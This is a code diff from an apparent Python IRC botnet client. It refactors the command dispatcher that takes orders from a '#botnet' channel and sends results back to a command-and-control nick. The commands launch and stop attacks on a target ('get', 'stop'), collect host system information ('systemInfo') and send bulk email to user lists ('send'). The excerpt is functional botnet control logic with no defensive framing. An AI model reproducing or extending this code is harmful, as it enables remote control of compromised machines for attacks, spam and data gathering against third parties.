@@ -34,26 +34,25 @@ def readMessage(s):
                 continue
             comando = m[m.index(":#botnet: ")+10::]
             comando = comando.split("|")
-            match comando[0]:
-                case "get":
-                    target, action = execRequest(comando[1],comando[2])
-                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
-                    
-                case "stop":
-                    target, action = stopAttack()
-                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
-                    
-                case "systemInfo":
-                    m = getSystemInfo()
-                    sendMessage(s, f"PRIVMSG cc #botnet: systemInfo|{m}")
-                    
-                case "send":
-                    target, action = batchEmail(comando[1],comando[2],comando[3])
-                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
-                    return
-                case "status":
-                    target, action = getStatus()
-                    sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
+            if comando[0] == "get":
+                target, action = execRequest(comando[1],comando[2])
+                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
+
+            elif comando[0] == "stop":
+                target, action = stopAttack()
+                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
+
+            elif comando[0] == "systemInfo":
+                m = getSystemInfo()
+                sendMessage(s, f"PRIVMSG cc #botnet: systemInfo|{m}")
+
+            elif comando[0] == "send":
+                target, action = batchEmail(comando[1],comando[2],comando[3])
+                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
+                return
+            elif comando[0] == "status":
+                target, action = getStatus()
+                sendMessage(s, f"PRIVMSG cc #botnet: info|{target}|{action}")
 
 
 def batchEmail(oggetto, message, utenti):
